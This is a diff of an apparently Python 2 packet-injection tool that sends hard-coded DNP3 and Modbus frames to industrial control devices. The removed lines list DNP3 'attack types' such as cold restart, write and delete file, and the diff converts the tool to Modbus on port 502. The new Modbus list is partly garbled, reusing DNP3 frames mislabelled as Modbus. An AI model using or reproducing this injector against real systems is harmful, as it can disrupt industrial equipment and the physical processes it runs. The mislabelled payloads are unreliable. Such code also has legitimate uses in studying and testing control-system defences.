@@ -23,7 +23,7 @@ dnp3_DeleteFile="056408c401000200390ddece1b218c"
 dnp3_ReadRequest="056405c903000400bd71"
 
 dnp3_list=[
-           "056405c001000004e921",  #dnp3_HealthCheck
+           "056405c001000004e921",  #dnp3_healthcheck
            "056408c40a000100fc42c0c00e7edc", #dnp3_WarmRestart
            "056408c40a000100fc42c0c00d9c86", #dnp3_ColdRestart
            "056412c403000400152dc1c10232010701fa7d0b460d01c863", #dnp3_Write
@@ -33,8 +33,20 @@ dnp3_list=[
            "056405c903000400bd71"            #dnp3_ReadRequest
     ]
 
+modbus_list=[
+           "2af100000006ff020063001e",  #modbus read decrete input
+           "05a000000006ff040001006305a100000006ff040029000205a200000006ff0408ab001605a300000006ff0408d20002", #modbus_Read Input Registers
+           "056408c40a000100fc42c0c00d9c86", #modbus
+           "056412c403000400152dc1c10232010701fa7d0b460d01c863", #modbus
+           "056408c401000200390ddece0f32e7", #modbus
+           "056408c401000200390ddece12f645", #modbus
+           "056408c401000200390ddece1b218c", #modbus
+           "056405c903000400bd71"            #modbus
+    ]
+
+
 HOST = "127.0.0.1"
-PORT = 20000
+PORT = 502
 BUFSIZ = 1024
 
 
@@ -44,7 +56,7 @@ def usage():
     -h / --help :help
     -i / --ip :ip address
     -p / --prot :destination port
-    -t / --type: DNP3 PDU tye
+    -t / --type: MODBUS PDU tye
 
     """)
     print_attack_type()
@@ -52,16 +64,9 @@ def usage():
 
 def print_attack_type():
     print(u"""
-Defined DNP3 attack type:
-'1: Health check'
-'2: Warm Restart'
-'3: Cold Restart'
-'3: Cold Restart'
-'4: Write'
-'5: Initialize data'
-'6: App function termination'
-'7: Delete file'
-'8: Request Link'
+Defined MODBUS attack type:
+'1: Read Decrete Inputs'
+'2: Read Input Registers
     """)
 
 
@@ -70,16 +75,16 @@ def debug(msg):
         print ("debug: %s" % msg)
 
 
-def send_dnp3_packet(socket, dnp3_type = 8):
+def send_modbus_packet(socket, modbus_type = 8):
  
-    dnp3_pdu = dnp3_list[int(dnp3_type) - 1]
-    print  ("Sending DNP3 packet to target %s: %s"%(HOST, dnp3_pdu))
-    socket.sendall(unhexlify(dnp3_pdu))
+    modbus_pdu = modbus_list[int(modbus_type) - 1]
+    print  ("Sending MODBUS packet to target %s: %s"%(HOST, modbus_pdu))
+    socket.sendall(unhexlify(modbus_pdu))
 
     #get response
-    #if (8 == int(dnp3_type)):
+    #if (8 == int(modbus_type)):
     resp = socket.recv(BUFSIZ)
-    print("Received DNP3 Response from %s: %s" % (HOST, resp.encode('hex')))
+    print("Received MODBUS Response from %s: %s" % (HOST, resp.encode('hex')))
  
 
 def debug(msg):
@@ -87,7 +92,7 @@ def debug(msg):
         print ("debug: %s" % msg)
 
 def main(argv):
-    DNP3_type = 8  #default to Request Link Status, if not specify DNP3 packet attack type [1..8]
+    MODBUS_type = 8  #default to Request Link Status, if not specify MODBUS packet attack type [1..8]
 
     try:
         opts,args = getopt.getopt(sys.argv[1:],"hp:i:t:",["help","ip=","port=","type="])
@@ -108,18 +113,15 @@ def main(argv):
              print  ("Destination PORT: %s"% PORT)
           elif opt in ("-t", "--type"):
              try:
-                 DNP3_type= int(arg)
+                 MODBUS_type= int(arg)
              except: 
-                 print ("DNP3 type %s is NOT recogizable!" % arg)
+                 print ("MODBUS type %s is NOT recogizable!" % arg)
                  sys.exit(1)
-             if (DNP3_type > len(dnp3_list)):
-                     print ("DNP3 type %s is out of range [1-%s]!" % (arg, len(dnp3_list)))
+             if (MODBUS_type > len(modbus_list)):
+                     print ("MODBUS type %s is out of range [1-%s]!" % (arg, len(modbus_list)))
                      sys.exit(1)
-             print  ("DNP3 injected type: %s"% DNP3_type)
-          else:
-             usage()
-             sys.exit(1)
-            
+             print  ("MODBUS injected type: %s"% MODBUS_type)
+           
                 
 
     try:
@@ -135,7 +137,7 @@ def main(argv):
     except error, e:
         print  ("Connect to target %s: %s error: %s" % (HOST, PORT, e))
  
-    send_dnp3_packet(tcpCliSock, DNP3_type)
+    send_modbus_packet(tcpCliSock, MODBUS_type)
 
     str1 = raw_input('> ')
     tcpCliSock.close()
